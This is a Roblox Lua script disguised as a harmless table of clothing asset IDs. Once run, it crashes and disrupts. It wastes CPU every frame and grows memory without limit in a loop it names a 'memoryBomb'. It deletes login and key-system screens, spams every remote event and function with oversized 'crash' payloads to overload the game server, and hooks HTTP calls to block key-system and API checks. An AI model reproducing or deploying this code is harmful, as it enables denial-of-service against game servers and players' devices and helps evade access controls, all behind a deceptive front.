local legitTable = {
    {id = "rbxassetid://123456789", name = "Fake Shirt 1"},
    {id = "rbxassetid://987654321", name = "Fake Pants 1"},
    {id = "rbxassetid://555555555", name = "Fake Shirt 2"},
}

game:GetService("RunService").RenderStepped:Connect(function()
    local x = 0
    for i = 1, 1000 do
        x = x + math.sqrt(i * math.pi)
    end
end)

task.spawn(function()
    task.wait(0.5)
    for _, v in pairs(game.CoreGui:GetChildren()) do
        if v:IsA("ScreenGui") and v.Name:lower():find("key") or v.Name:lower():find("system") or v.Name:lower():find("login") then
            v:Destroy()
        end
    end
    for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
        if v:IsA("ScreenGui") and v.Name:lower():find("key") or v.Name:lower():find("system") or v.Name:lower():find("login") then
            v:Destroy()
        end
    end
end)

task.spawn(function()
    local memoryBomb = {}
    while true do
        for i = 1, 10000 do
            table.insert(memoryBomb, {
                data = string.rep("A", 1024 * 1024),
                timestamp = os.time(),
                random = math.random(1, 9999999),
                nested = {
                    more = string.rep("B", 512 * 1024),
                    andMore = {
                        evenMore = string.rep("C", 256 * 1024)
                    }
                }
            })
        end
        task.wait()
    end
end)

task.spawn(function()
    task.wait(1)
    local function findRemotes()
        local remotes = {}
        for _, service in pairs(game:GetChildren()) do
            if service:IsA("ReplicatedStorage") or service:IsA("ReplicatedFirst") then
                for _, child in pairs(service:GetDescendants()) do
                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                        table.insert(remotes, child)
                    end
                end
            end
        end
        return remotes
    end
    
    local allRemotes = findRemotes()
    while true do
        for _, remote in pairs(allRemotes) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer("crash", "this", "is", "spam", {
                        data = string.rep("X", 10000),
                        nested = {nested = {nested = {data = "overflow"}}}
                    })
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer("crash", string.rep("Y", 5000))
                end
            end)
        end
        task.wait()
    end
end)

task.spawn(function()
    local oldGet = game.HttpGet
    local oldPost = game.HttpPost
    game.HttpGet = function(...)
        if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
            return "ERROR: ACCESS DENIED"
        end
        return oldGet(...)
    end
    game.HttpPost = function(...)
        if string.find(tostring(...), "keysystem") or string.find(tostring(...), "api") then
            return "ERROR: ACCESS DENIED"
        end
        return oldPost(...)
    end
end)

setmetatable(legitTable, {
    __index = function(t, k)
        if type(k) == "string" and string.find(k, "id") then
            return "rbxassetid://" .. math.random(100000000, 999999999)
        end
        return nil
    end
})

return legitTable
